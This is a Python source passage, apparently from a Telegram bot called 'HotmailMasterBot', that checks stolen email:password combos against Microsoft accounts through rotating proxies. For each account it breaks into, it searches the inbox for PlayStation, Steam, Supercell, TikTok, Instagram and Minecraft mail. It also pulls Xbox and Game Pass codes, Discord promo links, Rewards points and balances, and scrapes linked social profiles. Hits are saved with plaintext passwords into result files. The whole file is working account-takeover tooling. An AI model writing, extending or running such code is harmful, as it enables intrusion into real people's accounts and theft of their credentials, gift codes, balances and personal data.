            aurl = btn.get('data-actionurl', '').replace('&amp;', '&')
            title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
            if any(kw in title.lower() for kw in ['gift card', 'amazon', 'walmart', 'target', 'visa']):
                continue
            if aurl:
                if aurl.startswith('/'):
                    aurl = 'https://rewards.bing.com' + aurl
                try:
                    pd = {}
                    if vt:
                        pd['__RequestVerificationToken'] = vt
                    cr = sess.post(aurl, data=pd,
                                   headers={"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
                    m = XCODE_RE.search(cr.text)
                    if m:
                        codes.append((m.group(), title))
                except:
                    pass
    except:
        pass
    return codes


def _search_mail(sess, access_token, cid, query):
    if not access_token or not cid:
        return 0
    try:
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": query},
                "Size": 50,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        headers = {
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Authorization': f'Bearer {access_token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json'
        }
        r = sess.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if 'EntitySets' in data and data['EntitySets']:
                es = data['EntitySets'][0]
                if 'ResultSets' in es and es['ResultSets']:
                    return es['ResultSets'][0].get('Total', 0)
        return 0
    except:
        return 0


def _search_mail_with_preview(sess, access_token, cid, query):
    if not access_token or not cid:
        return 0, []
    try:
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": query},
                "Size": 10,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        headers = {
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Authorization': f'Bearer {access_token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json'
        }
        r = sess.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            total = 0
            results = []
            if 'EntitySets' in data and data['EntitySets']:
                es = data['EntitySets'][0]
                if 'ResultSets' in es and es['ResultSets']:
                    rs = es['ResultSets'][0]
                    total = rs.get('Total', 0)
                    results = rs.get('Results', [])
            return total, results
        return 0, []
    except:
        return 0, []


def check_psn(sess, access_token, cid):
    return _search_mail(sess, access_token, cid,
                        "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation")


def check_steam(sess, access_token, cid):
    return _search_mail(sess, access_token, cid,
                        "noreply@steampowered.com OR steam")


def check_supercell(sess, access_token, cid):
    found_games = []
    games = ["Clash of Clans", "Clash Royale", "Brawl Stars", "Hay Day", "Boom Beach"]
    for game in games:
        try:
            count = _search_mail(sess, access_token, cid, game)
            if count > 0:
                found_games.append(game)
            time.sleep(0.2)
        except:
            continue
    return found_games


def check_tiktok(sess, access_token, cid):
    """Advanced TikTok check with full profile capture"""
    try:
        # Search inbox for TikTok emails
        inbox_result = _search_tiktok_inbox(sess, access_token, cid)
        if not inbox_result or not inbox_result.get('username'):
            return None
        
        username = inbox_result['username']
        emails_count = inbox_result.get('emails_count', 0)
        
        # Get full TikTok profile
        profile = _get_tiktok_profile(sess, username, email=None)
        if not profile:
            profile = _get_tiktok_profile_web(username)
        
        if profile:
            return {
                'username': username,
                'emails_count': emails_count,
                'full_name': profile.get('full_name', 'N/A'),
                'followers': profile.get('followers', 0),
                'following': profile.get('following', 0),
                'likes': profile.get('likes', 0),
                'videos': profile.get('videos', 0),
                'verified': profile.get('verified', False),
                'private': profile.get('private', False),
                'bio': profile.get('bio', ''),
                'avatar_url': profile.get('avatar_url', ''),
                'create_time': profile.get('create_time', 0),
                'user_id': profile.get('id', ''),
                'region': profile.get('region', 'Unknown'),
                'language': profile.get('language', 'Unknown')
            }
        return {'username': username, 'emails_count': emails_count}
    except:
        return None


def check_instagram(sess, access_token, cid):
    """Advanced Instagram check with full profile capture"""
    try:
        # Search inbox for Instagram emails
        inbox_result = _search_instagram_inbox(sess, access_token, cid)
        if not inbox_result or not inbox_result.get('username'):
            return None
        
        username = inbox_result['username']
        emails_count = inbox_result.get('emails_count', 0)
        
        # Get full Instagram profile
        profile = _get_instagram_profile(username)
        
        if profile:
            return {
                'username': username,
                'emails_count': emails_count,
                'full_name': profile.get('full_name', 'N/A'),
                'followers': profile.get('followers', 0),
                'following': profile.get('following', 0),
                'posts': profile.get('posts', 0),
                'verified': profile.get('verified', False),
                'private': profile.get('private', False),
                'bio': profile.get('bio', ''),
                'avatar_url': profile.get('profile_pic', ''),
                'user_id': profile.get('user_id', ''),
                'professional': profile.get('professional', False),
                'category': profile.get('category', 'N/A'),
                'external_url': profile.get('external_url', 'N/A'),
                'email': profile.get('email', 'N/A'),
                'phone': profile.get('phone', 'N/A')
            }
        return {'username': username, 'emails_count': emails_count}
    except:
        return None


# ══════════════════════════════════════════════════════════
#  TIKTOK HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════

def _xor_encode(text):
    """XOR encode for TikTok API"""
    key = "webapp1.0+202106"
    result = []
    for i, char in enumerate(text):
        result.append(chr(ord(char) ^ ord(key[i % len(key)])))
    return ''.join(result)


def _get_followers_range(count):
    """Get followers range name"""
    if count < 1000: return '0-999'
    elif count < 2000: return '1k-1.9k'
    elif count < 3000: return '2k-2.9k'
    elif count < 4000: return '3k-3.9k'
    elif count < 5000: return '4k-4.9k'
    elif count < 6000: return '5k-5.9k'
    elif count < 7000: return '6k-6.9k'
    elif count < 8000: return '7k-7.9k'
    elif count < 9000: return '8k-8.9k'
    elif count < 10000: return '9k-9.9k'
    elif count < 100000: return '10k-99k'
    elif count < 200000: return '100k-199k'
    elif count < 300000: return '200k-299k'
    elif count < 400000: return '300k-399k'
    elif count < 500000: return '400k-499k'
    elif count < 600000: return '500k-599k'
    elif count < 700000: return '600k-699k'
    elif count < 800000: return '700k-799k'
    elif count < 900000: return '800k-899k'
    elif count < 1000000: return '900k-999k'
    else: return '1m+'


def _calculate_account_age(create_timestamp):
    """Calculate account age"""
    try:
        if create_timestamp and create_timestamp > 0:
            created = datetime.fromtimestamp(create_timestamp)
            age = datetime.now() - created
            years = age.days // 365
            months = (age.days % 365) // 30
            if years > 0:
                return f"{years} year(s) {months} month(s)"
            elif months > 0:
                return f"{months} month(s)"
            else:
                return f"{age.days} day(s)"
    except:
        pass
    return "Unknown"


def _search_tiktok_inbox(sess, access_token, cid):
    """Search for TikTok emails in inbox"""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": "tiktok"},
                "Size": 50,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        r = sess.post(search_url, json=payload, headers=headers, timeout=20)
        if r.status_code != 200:
            return None
        
        search_text = r.text
        tiktok_senders = [
            "no-reply@shop.tiktok.com", "notification@service.tiktok.com",
            "noreply@account.tiktok.com", "register@account.tiktok.com", "no-reply@tiktok.com"
        ]
        tiktok_count = sum(search_text.count(sender) for sender in tiktok_senders)
        if tiktok_count == 0:
            return None
        
        # Extract username
        username_patterns = [
            r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
            r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})', r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
            r'@([a-zA-Z0-9_\.]{2,30})'
        ]
        username = None
        for pattern in username_patterns:
            match = re.search(pattern, search_text)
            if match:
                potential_username = match.group(1)
                if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                    username = potential_username
                    break
        
        return {"emails_count": tiktok_count, "username": username}
    except:
        return None


def _get_tiktok_profile(sess, username, email=None):
    """Get TikTok profile using API - EXACT like api_code.py"""
    try:
        import secrets
        
        # Generate secret and xor email
        secret = secrets.token_hex(16)
        xor_email = _xor_encode(email) if email else ""
        
        # Random iid and device_id
        iid = str(random.randint(1, 10**19))
        device_id = str(random.randint(1, 10**19))
        
        params = {
            "request_tag_from": "h5",
            "fixed_mix_mode": "1",
            "mix_mode": "1",
            "account_param": xor_email,
            "scene": "1",
            "device_platform": "android",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            "iid": iid,
            "device_id": device_id,
        }
        
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret,
            "install_id": iid
        }
        
        headers = {
            'user-agent': random.choice(USER_AGENTS),
            'x-ss-req-ticket': str(int(time.time() * 1000)),
            'passport-sdk-version': '19',
        }
        
        url = "https://api16-normal-c-useast1a.tiktokv.com/passport/account/info/v2/"
        
        response = requests.get(url, params=params, cookies=cookies, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('data') and data['data'].get('username'):
                user_info = data['data']
                
                return {
                    'username': user_info.get('username', ''),
                    'full_name': user_info.get('screen_name', ''),
                    'id': user_info.get('user_id', ''),
                    'bio': user_info.get('bio_description', ''),
                    'followers': user_info.get('follower_count', 0),
                    'following': user_info.get('following_count', 0),
                    'friends': user_info.get('mplatform_followers_count', 0),
                    'likes': user_info.get('total_favorited', 0),
                    'videos': user_info.get('aweme_count', 0),
                    'verified': user_info.get('verified', False),
                    'private': user_info.get('secret', False),
                    'avatar_url': user_info.get('avatar_larger', {}).get('url_list', [''])[0],
                    'create_time': user_info.get('create_time', 0),
                    'language': user_info.get('language', 'Unknown'),
                    'region': user_info.get('region', 'Unknown')
                }
        
        return None
    except:
        return None


def _get_tiktok_profile_web(username):
    """Get TikTok profile from web"""
    try:
        headers = {'user-agent': UA, 'accept': 'text/html,application/xhtml+xml'}
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200:
            html = response.text
            profile_data = {'username': username, 'followers': 0, 'following': 0, 'likes': 0, 'videos': 0, 'verified': False, 'full_name': '', 'bio': '', 'private': False}
            json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
            json_match = re.search(json_pattern, html, re.DOTALL)
            if json_match:
                try:
                    data = json.loads(json_match.group(1))
                    user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                    user = user_detail.get('user', {})
                    stats_data = user_detail.get('stats', {})
                    profile_data['followers'] = stats_data.get('followerCount', 0)
                    profile_data['following'] = stats_data.get('followingCount', 0)
                    profile_data['likes'] = stats_data.get('heartCount', 0)
                    profile_data['videos'] = stats_data.get('videoCount', 0)
                    profile_data['verified'] = user.get('verified', False)
                    profile_data['full_name'] = user.get('nickname', '')
                    profile_data['bio'] = user.get('signature', '')
                    profile_data['avatar_url'] = user.get('avatarLarger', '')
                    profile_data['private'] = user.get('privateAccount', False)
                except:
                    pass
            return profile_data if profile_data['followers'] > 0 else None
        return None
    except:
        return None


# ══════════════════════════════════════════════════════════
#  INSTAGRAM HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════

def _search_instagram_inbox(sess, access_token, cid):
    """Search for Instagram emails in inbox"""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": "instagram"},
                "Size": 50,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        r = sess.post(search_url, json=payload, headers=headers, timeout=20)
        if r.status_code != 200:
            return None
        
        search_text = r.text
        instagram_senders = [
            "no-reply@mail.instagram.com", "security@mail.instagram.com",
            "help@mail.instagram.com", "noreply@instagram.com"
        ]
        instagram_count = sum(search_text.count(sender) for sender in instagram_senders)
        if instagram_count == 0:
            return None
        
        # Extract username
        username_patterns = [
            r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})', r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
            r'@([a-zA-Z0-9_\.]{2,30})', r'(?i)account\s+@?([a-zA-Z0-9_\.]{2,30})'
        ]
        username = None
        for pattern in username_patterns:
            match = re.search(pattern, search_text)
            if match:
                potential_username = match.group(1)
                if not any(x in potential_username.lower() for x in ['instagram', 'mail', 'email', 'hotmail', 'outlook']):
                    username = potential_username
                    break
        
        return {"emails_count": instagram_count, "username": username}
    except:
        return None


def _get_instagram_profile(username):
    """Get Instagram profile info (ENHANCED) - Using httpx with http2 like the API"""
    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.instagram.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        try:
            import httpx
            with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
                response = session.get(url)
                data = response.json()
        except:
            # Fallback to requests if httpx fails
            response = requests.get(url, headers=headers, timeout=10.0)
            data = response.json()
        
        user = data.get('data', {}).get('user', {})
        
        if not user:
            return None
        
        profile_pic = user.get('profile_pic_url', '')
        email = user.get('business_email') or user.get('public_email') or 'N/A'
        phone = user.get('business_phone_number') or user.get('public_phone_number') or 'N/A'
        
        followers = user.get('edge_followed_by', {}).get('count', 0)
        following = user.get('edge_follow', {}).get('count', 0)
        posts = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
        
        return {
            'username': user.get('username', ''),
            'full_name': user.get('full_name', ''),
            'user_id': user.get('id', ''),
            'bio': user.get('biography', ''),
            'followers': followers,
            'following': following,
            'posts': posts,
            'private': user.get('is_private', False),
            'verified': user.get('is_verified', False),
            'professional': user.get('is_professional_account', False),
            'category': user.get('category_name', 'N/A'),
            'location': user.get('location', {}).get('name', 'N/A'),
            'email': email,
            'phone': phone,
            'external_url': user.get('external_url', 'N/A'),
            'profile_pic': profile_pic
        }
    except:
        return None


def check_minecraft_via_xbox(sess):
    try:
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        tm = re.search(r'access_token=([^&]+)', r.url)
        if not tm:
            return None, None
        rps_ticket = tm.group(1)
        xh = {"User-Agent": UA, "Content-Type": "application/json", "x-xbl-contract-version": "1"}
        ur = sess.post("https://user.auth.xboxlive.com/user/authenticate",
                       headers=xh,
                       json={"Properties": {"AuthMethod": "RPS", "RpsTicket": rps_ticket,
                                            "SiteName": "user.auth.xboxlive.com"},
                             "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                       timeout=10)
        if ur.status_code != 200:
            return None, None
        user_token = ur.json().get("Token")
        if not user_token:
            return None, None
        xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                       headers=xh,
                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
                       timeout=10)
        xd = xr.json()
        if "Token" not in xd:
            xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                           headers=xh,
                           json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                                 "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"},
                           timeout=10)
            xd = xr.json()
            if "Token" not in xd:
                return None, None
        xsts_token = xd["Token"]
        uhs = xd["DisplayClaims"]["xui"][0]["uhs"]
        mc_auth = sess.post(
            "https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
            headers={"User-Agent": UA, "Content-Type": "application/json"},
            timeout=10)
        if mc_auth.status_code != 200:
            return None, None
        mc_token = mc_auth.json().get("access_token")
        if not mc_token:
            return None, None
        mc_profile = sess.get(
            "https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {mc_token}", "User-Agent": UA},
            timeout=10)
        if mc_profile.status_code == 200:
            data = mc_profile.json()
            mc_name = data.get('name', 'Unknown')
            return mc_name, data.get('id', '')
        return None, None
    except:
        return None, None


def check_minecraft_via_mail(sess, access_token, cid):
    return _search_mail(sess, access_token, cid,
                        "from:noreply@account.mojang.com OR from:noreply@email.accounts.mojang.com OR minecraft OR mojang")


# ══════════════════════════════════════════════════════════
#  CHECKER SESSION (per-user check)
# ══════════════════════════════════════════════════════════

class CheckerStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.valid = 0
        self.bad_lines = 0
        self.checked = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.retries = 0
        self.proxy_err = 0
        self.psn = 0
        self.steam = 0
        self.supercell = 0
        self.tiktok = 0
        self.instagram = 0
        self.minecraft = 0
        self.xbox_codes = 0
        self.xbox_pulled = 0  # total codes found (all statuses)
        self.xbox_pulled_valid = 0  # valid + balance + valid_card only
        self.discord_total = 0
        self.discord_valid = 0
        self.discord_claimed = 0
        self.discord_unk = 0
        self.balance = 0
        self.rp_hits = 0
        self.rp_total_pts = 0
        self.xgpu = 0
        self.xgpp = 0
        self.xgpe = 0
        self.m365 = 0
        self.other_svc = 0
        self.svc_free = 0
        self.all_hits = []
        self.svc_results = []
        self.all_services = []
        self.balance_list = []
        self.rp_list = []
        self.discord_list = []
        self.xbox_code_list = []
        # Xbox Pulled: per-status lists (em, pw, name_or_msg, code) - like api_exam
        self.xbox_pulled_by_status = {
            "VALID": [], "BALANCE_CODE": [], "VALID_REQUIRES_CARD": [],
            "REDEEMED": [], "EXPIRED": [], "INVALID": [], "DEACTIVATED": [],
            "UNKNOWN": [], "REGION_LOCKED": [], "RATE_LIMITED": [], "ERROR": [],
        }
        self.psn_list = []
        self.steam_list = []
        self.supercell_list = []
        self.tiktok_list = []
        self.instagram_list = []
        self.minecraft_list = []
        self.bad_list = []
        self.twofa_list = []
        self.error_list = []
        # Followers ranges for TikTok
        self.tiktok_followers_ranges = {
            '0-999': 0, '1k-1.9k': 0, '2k-2.9k': 0, '3k-3.9k': 0, '4k-4.9k': 0,
            '5k-5.9k': 0, '6k-6.9k': 0, '7k-7.9k': 0, '8k-8.9k': 0, '9k-9.9k': 0,
            '10k-99k': 0, '100k-199k': 0, '200k-299k': 0, '300k-399k': 0, '400k-499k': 0,
            '500k-599k': 0, '600k-699k': 0, '700k-799k': 0, '800k-899k': 0, '900k-999k': 0,
            '1m+': 0
        }
        # Followers ranges for Instagram
        self.instagram_followers_ranges = {
            '0-999': 0, '1k-1.9k': 0, '2k-2.9k': 0, '3k-3.9k': 0, '4k-4.9k': 0,
            '5k-5.9k': 0, '6k-6.9k': 0, '7k-7.9k': 0, '8k-8.9k': 0, '9k-9.9k': 0,
            '10k-99k': 0, '100k-199k': 0, '200k-299k': 0, '300k-399k': 0, '400k-499k': 0,
            '500k-599k': 0, '600k-699k': 0, '700k-799k': 0, '800k-899k': 0, '900k-999k': 0,
            '1m+': 0
        }

    def inc(self, f, v=1):
        with self.lock:
            setattr(self, f, getattr(self, f) + v)

    def add(self, f, item):
        with self.lock:
            getattr(self, f).append(item)


class CheckerSession:
    def __init__(self, user_id, combos, total_lines, bad_lines):
        self.user_id = user_id
        self.combos = combos
        self.stats = CheckerStats()
        self.stats.total = total_lines
        self.stats.valid = len(combos)
        self.stats.bad_lines = bad_lines
        self.pxr = ProxyRotator(init_proxies(), True)
        self.stop_event = threading.Event()
        self.started = time.time()
        self.msg_id = None
        self.finished = False
        self.executor = None
        self.futures = []

    def process_one(self, email, pwd):
        if self.stop_event.is_set():
            return

        pxr_inst = self.pxr
        st = self.stats

        for attempt in range(MAX_RETRIES):
            if self.stop_event.is_set():
                return
            sess, status, access_token, cid = ms_login(email, pwd, pxr_inst)
            if status == "OK":
                break
            if status in ("BAD", "2FA"):
                break
            st.inc("retries")
            time.sleep(2 * (attempt + 1))

        st.inc("checked")

        if status == "BAD":
            st.inc("bad")
            st.add("bad_list", f"{email}:{pwd}")
            return
        if status == "2FA":
            st.inc("twofa")
            st.add("twofa_list", f"{email}:{pwd}")
            return
        if status == "ERROR":
            st.inc("errors")
            st.add("error_list", f"{email}:{pwd}")
            return

        # SERVICES
        svcs = []
        try:
            svcs = check_services(sess, email)
        except:
            pass

        active = [s for s in svcs if s["cat"] in ("ACTIVE", "TRIAL", "COMMERCIAL")]
        if active:
            for s in active:
                c = classify_svc(s["name"])
                st.inc(c)
            svc_lines = [fmt_svc(s) for s in svcs]
            st.add("svc_results", (email, pwd, svcs))
            st.add("all_hits", (email, pwd, "SVC", "\n".join(svc_lines)))
        else:
            st.inc("svc_free")

        if svcs:
            st.add("all_services", (email, pwd, svcs))

        # BALANCE
        try:
            bal, cur, holder = check_balance(sess)
            if bal is not None and bal > 0:
                st.inc("balance")
                st.add("balance_list", (email, pwd, bal, cur or "", holder or ""))
                st.add("all_hits", (email, pwd, "BAL", f"${bal} {cur or ''}"))
        except:
            pass

        # RP
        try:
            pts = check_rp(sess)
            if pts is not None and pts > 0:
                st.inc("rp_hits")
                with st.lock:
                    st.rp_total_pts += pts
                st.add("rp_list", (email, pwd, pts))
                st.add("all_hits", (email, pwd, "RP", str(pts)))
        except:
            pass

        # DISCORD
        xbl = None
        try:
            xbl = get_xbl(sess)
            if xbl:
                promos = check_discord(sess, xbl, pxr_inst)
                for lnk, _ in promos:
                    st.inc("discord_total")
                    s2 = disc_status(lnk, pxr_inst)
                    if s2 == "VALID":
                        st.inc("discord_valid")
                        st.add("discord_list", (email, pwd, lnk, "VALID"))
                        st.add("all_hits", (email, pwd, "DISC", lnk))
                    elif s2 == "CLAIMED":
                        st.inc("discord_claimed")
                        st.add("discord_list", (email, pwd, lnk, "CLAIMED"))
                    else:
                        st.inc("discord_unk")
                        st.add("discord_list", (email, pwd, lnk, "UNK"))
        except:
            pass

        # XBOX CODES
        try:
            codes = check_xbox_codes(sess)
            for code, desc in codes:
                st.inc("xbox_codes")
                st.add("xbox_code_list", (email, pwd, code, desc))
                st.add("all_hits", (email, pwd, "XCODE", f"{code} | {desc}"))
        except:
            pass

        # XBOX PULLED (fetch from Game Pass + validate, save all by status like api_exam)
        if XBOX_PULLED_AVAILABLE:
            try:
                proxy = pxr_inst.get() if pxr_inst else None
                fetch_sess = requests.Session()
                if proxy:
                    fetch_sess.proxies = proxy
                fetch_sess.headers.update({"User-Agent": UA})
                url_post, ppft = fetch_oauth_tokens(fetch_sess)
                if url_post:
                    rps = fetch_login(fetch_sess, email, pwd, url_post, ppft)
                    if rps:
                        uhs, xsts = get_xbox_tokens(fetch_sess, rps)
                        if uhs:
                            raw_codes = fetch_codes_from_xbox(fetch_sess, uhs, xsts)
                            if raw_codes:
                                val_sess = xbox_pulled_login(email, pwd, proxy)
                                if val_sess:
                                    for code in raw_codes:
                                        if self.stop_event.is_set():
                                            break
                                        result = xbox_pulled_validate(val_sess, code)
                                        status = result.get("status", "UNKNOWN")
                                        msg = result.get("message", "")
                                        name = result.get("product_title") or ""
                                        if not name and msg and "|" in msg:
                                            name = msg.split("|")[-1].strip()
                                        if not name:
                                            name = msg or status
                                        st.inc("xbox_pulled")
                                        if status in ("VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"):
                                            st.inc("xbox_pulled_valid")
                                        with st.lock:
                                            key = status if status in st.xbox_pulled_by_status else "UNKNOWN"
                                            st.xbox_pulled_by_status[key].append((email, pwd, name, code))
                                        st.add("all_hits", (email, pwd, "XBOX_PULLED", f"{status}: {name} | {code}"))
                            fetch_sess.close()
            except Exception:
                pass

        # PSN
        try:
            psn_count = check_psn(sess, access_token, cid)
            if psn_count > 0:
                st.inc("psn")
                st.add("psn_list", (email, pwd, psn_count))
                st.add("all_hits", (email, pwd, "PSN", f"{psn_count} orders"))
        except:
            pass

        # STEAM
        try:
            steam_count = check_steam(sess, access_token, cid)
            if steam_count > 0:
                st.inc("steam")
                st.add("steam_list", (email, pwd, steam_count))
                st.add("all_hits", (email, pwd, "STEAM", f"{steam_count} items"))
        except:
            pass

        # SUPERCELL
        try:
            sc_games = check_supercell(sess, access_token, cid)
            if sc_games:
                st.inc("supercell")
                st.add("supercell_list", (email, pwd, sc_games))
                st.add("all_hits", (email, pwd, "SC", ",".join(sc_games)))
        except:
            pass

        # TIKTOK (Advanced with full profile)
        try:
            tt_result = check_tiktok(sess, access_token, cid)
            if tt_result and tt_result.get('username'):
                st.inc("tiktok")
                username = tt_result['username']
                followers = tt_result.get('followers', 0)
                
                # Update followers range
                range_name = _get_followers_range(followers)
                with st.lock:
                    st.tiktok_followers_ranges[range_name] += 1
                
                # Format details
                if followers > 0:
                    detail = f"@{username} | {followers:,} followers"
                    if tt_result.get('verified'):
                        detail += " ✓"
                else:
                    detail = f"@{username}"
                
                st.add("tiktok_list", (email, pwd, tt_result))
                st.add("all_hits", (email, pwd, "TT", detail))
        except:
            pass

        # INSTAGRAM (Advanced with full profile)
        try:
            ig_result = check_instagram(sess, access_token, cid)
            if ig_result and ig_result.get('username'):
                st.inc("instagram")
                username = ig_result['username']
                followers = ig_result.get('followers', 0)
                
                # Update followers range
                range_name = _get_followers_range(followers)
                with st.lock:
                    st.instagram_followers_ranges[range_name] += 1
                
                # Format details
                if followers > 0:
                    detail = f"@{username} | {followers:,} followers"
                    if ig_result.get('verified'):
                        detail += " ✓"
                else:
                    detail = f"@{username}"
                
                st.add("instagram_list", (email, pwd, ig_result))
                st.add("all_hits", (email, pwd, "IG", detail))
        except:
            pass

        # MINECRAFT
        try:
            mc_name, mc_uuid = check_minecraft_via_xbox(sess)
            if mc_name:
                st.inc("minecraft")
                st.add("minecraft_list", (email, pwd, mc_name))
                st.add("all_hits", (email, pwd, "MC", mc_name))
            else:
                mc_mail = check_minecraft_via_mail(sess, access_token, cid)
                if mc_mail > 0:
                    st.inc("minecraft")
                    st.add("minecraft_list", (email, pwd, f"mail:{mc_mail}"))
                    st.add("all_hits", (email, pwd, "MC", f"mail:{mc_mail}"))
        except:
            pass


# ══════════════════════════════════════════════════════════
#  RESULT ZIP BUILDER
# ══════════════════════════════════════════════════════════

def get_bot_username():
    """Fetch bot username from token."""
    try:
        bot_info = bot.get_me()
        if bot_info and bot_info.username:
            return f"@{bot_info.username}"
    except:
        pass
    return "@HotmailMasterBot"  # fallback


def build_result_zip(cs: CheckerSession, user=None):
    st = cs.stats
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tmpdir = tempfile.mkdtemp(prefix="checker_")
    odir = os.path.join(tmpdir, f"results_{ts}")
    os.makedirs(odir, exist_ok=True)

    bot_username = get_bot_username()

    def w(fn, lines):
        with open(os.path.join(odir, fn), "w", encoding="utf-8") as f:
            for l in lines:
                f.write(l + "\n")

    # all_hits.txt
    lines = []
    for em, pw, cat, det in st.all_hits:
        lines.append(f"{em}:{pw} | {cat} | {det}")
    w("all_hits.txt", lines)

    # services_hits.txt
    lines = []
    for em, pw, svcs in st.svc_results:
        lines.append(f"{em}:{pw}")
        for i, s in enumerate(svcs):
            pfx = "  +-- " if i == len(svcs) - 1 else "  |-- "
            lines.append(pfx + fmt_svc(s))
        lines.append("-" * 50)
    w("services_hits.txt", lines)

    # all_services.txt
    lines = []
    for em, pw, svcs in st.all_services:
        lines.append(f"{em}:{pw}")
        for i, s in enumerate(svcs):
            pfx = "  +-- " if i == len(svcs) - 1 else "  |-- "
            lines.append(pfx + fmt_svc(s))
        lines.append("-" * 50)
    w("all_services.txt", lines)

    # balance_hits.txt
    lines = []
    for em, pw, bal, cur, holder in st.balance_list:
        lines.append(f"{em}:{pw} | ${bal} {cur} | {holder}")
    w("balance_hits.txt", lines)

    # rp_hits.txt
    lines = []
    for em, pw, pts in sorted(st.rp_list, key=lambda x: x[2], reverse=True):
        lines.append(f"[{pts}] {em}:{pw}")
    w("rp_hits.txt", lines)

    # discord_promos.txt
    lines = []
    for em, pw, lnk, s2 in st.discord_list:
        lines.append(f"{em}:{pw} | {lnk} | {s2}")
    w("discord_promos.txt", lines)

